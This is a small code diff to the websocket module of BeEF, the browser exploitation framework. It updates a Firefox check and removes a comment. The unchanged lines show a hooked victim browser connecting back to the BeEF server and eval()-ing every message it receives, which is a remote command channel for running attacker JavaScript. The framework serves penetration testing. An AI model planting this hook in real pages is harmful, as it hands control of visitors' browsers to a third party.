@@ -24,8 +24,8 @@ beef.websocket = {
     init:function () {
         var webSocketServer = beef.net.host;
         var webSocketPort = 11989;
-        //@todo ceck if we have to use wss or ws we need a globalvalue
-        if (beef.browser.isFF() && ! beef.browser.isFF11) {
+
+        if (beef.browser.isFF() && !!window.MozWebSocket) {
             beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
 
         } else{
@@ -48,8 +48,6 @@ beef.websocket = {
         this.socket.onmessage = function (message){
             console.log("Received message via WS.");
             eval(message.data);
-
-             /*END POC*/
            }
 
     },
